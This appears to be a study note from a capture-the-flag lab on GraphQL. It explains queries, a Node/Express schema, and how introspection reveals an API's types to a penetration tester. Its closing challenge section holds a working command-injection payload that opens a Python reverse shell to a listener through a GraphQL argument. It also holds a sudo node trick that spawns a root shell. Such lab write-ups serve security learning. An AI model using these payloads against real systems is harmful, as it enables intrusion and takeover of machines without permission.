# GraphQL

## What is GraphQL

GraphQL is a way to interact with APIs.
It is not a database, nor a database language,
it is simply a way to interact with APIs.
For example let's say you were trying to figure out the nutritional information
of a box of cereal given that cereal's name.

In a normal REST api, you might do something like this

```bash
curl cereal.api -d "title='Lucky Charms'"
```

and you would receive a JSON response looking like

```json
{
    "sugar": "50000000g"
    "protein": "0g"
    ...
}
```

In GraphQL, your query would look like this

```GraphQL
{
Cereal(name: "Lucky Charms")
  {
   sugar
   protein
  }
}  
```

Note: you can still use curl with GraphQL,
you would just need to URL encode this into something that curl would accept.

It's important to note that GraphQL **isn't inherently vulnerable**,
however since we have the ability to pass data to an API,
all of the same injection techniques still apply.
However GraphQL specifically does give us some information that we can use to
help aid our efforts, and we'll learn more about that in the upcoming tasks

## How GraphQL works

In order to properly understand how to use the information that GraphQL gives us,
we need to know how to write a query. In essence, a GraphQL query works like this.

```GraphQL
{

type  {
     field,
     field,
      ...
        }
}
```

*All code examples are in NodeJS, using Express*

```javascript
var schema = buildSchema(
    type Query {
        Cereal(name: String): Cereal
    },
    type Cereal {
        name: String
        sugar: String
        protein: String
    }
);

var cereal = [
    {
        "name": "Lucky Charms",
        "sugar": "50000000g",
        "protein": "0mg"
    },
    {
        "name": "Cinnamon Toast Crunch",
        "sugar": "50000000000g",
        "protein": "0mg"
    }
]

var getCereal = function(args) {
    for(i = 0; i < cereal.length; i++) {
        if(cereal[i]["name"] == args.name) {
            return cereal[i];
        }
    }
}

var root = {
    Cereal: getCereal,
};
```

Welp `schema` is where we define the types we are able to use,
as well the fields of those types.
"Query" is the root type, anything put in here we are allowed to use in our query.
In this type we state that we want the ability to use the object Cereal in our query,
we want it to take an argument called name, and we want it to be of Type Cereal

We provided the name of the object we defined in query,
and the argument we specified that it should take.

Next we have the type Cereal,
here we define all of the fields that can return data in our response.

We specified that sugar and protein are valid data fields,
and we can see that they return data.
You may have noticed that name is not part of the query,
that is because we are not required to specify all of the fields,
we can get as much or as little information as we need!

Next we are defining the data that can be returned by the query.

From a developers stand point, this shows us how we can return data,
and it's in pretty much the exact same as JSON.
We can change and manipulate this data as needed.

Next we define the function that does all of the work.

This code takes the input that we provide in our query,
goes through our cereal array, and checks if a valid cereal name is in the array.
If we were to make a query with the input  Cereal(name: "Cinnamon Toast Crunch")
it would take that name value and return

Which is the exact format that GraphQL expects to return data in.

Next we have the root variable.

This is pretty simple,
it tells GraphQL that whenever it's dealing with the Cereal object,
to use the getCereal function.

For a final go through, it works like this.
We use the object Cereal, and provide an input of "Cinnamon Toast Crunch".
Then we request that we want to
know how much sugar and how much protein is in the cereal.
The API takes our input, puts it in the getCereal function and returns our output.

## How to extract sensitive info from GraphQL

One great benefit is that GraphQL effectively documents itself.
GraphQL comes bundled with certain objects, types,
and fields that allow us to get information on all the other types, fields, and objects.

From the perspective of a Penetration Tester,
this means that we aren't going into this fully blind,
with a regular API we may just have to guess and pray at endpoints and parameters
if there's no publicly available documentation,
however GraphQL gives us this information.
Let's take a look at just how that works.

Let's go through this query, recall that in the code,
we defined all of our types in the schema method.
GraphQL actually documents this, through the `__schema` object,
which contains information about all the types we defined.
Next we want to know about types, so we query the field types.
From there all we need to do is query the name and description of those types
which gives us the output shown below.

It's pretty intuitive,
we're requesting information on all of the types that GraphQL has,
it just so happens that it shows us types that we created.
Just by looking at it, we can tell that Cereal is a pretty suspicious type,
let's request more information about it.

We can use the build in object `_type` to do this,
we use the name parameter to specify which type we want more information on.
From there we can query what the fields are for whatever type we can specify,
and then we can get the name of all of those fields.

Now we know all of the fields we can query.
With a typical REST API,
getting this much information could have taken quite a while in fuzzing!
Overall introspection is a useful way to get additional information on the API
and how it works.

[poat](https://tryhackme.com/room/graphql)

## A note

The interface that you've been seeing me use is called GraphIQL.
It's effectively just a graphical web interface to make GraphQL queries,
which is installed alongside the NodeJS GraphQL module and can only make queries
to the server on which it is installed.
Because of this, when you're pentesting GraphQL, you may not have access to GraphIQL.
In this case you may need to URL encode your queries and manually make a post
request using a tool like CuRL, like you would with any other API.

Note:  While GraphIQL is exclusive to your server,
there is a chrome/firefox extension that acts as a client to other servers called
[Altair](https://altair.sirmuel.design/).

## Challenge

```GraphQL
{
  Ping(ip: "10.10.179.108 & python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.11.1.219\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' ") {
    output
  }
}
```

```javascript
inside server.js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});
```

```bash
sudo /usr/bin/node /home/para/server.js
```
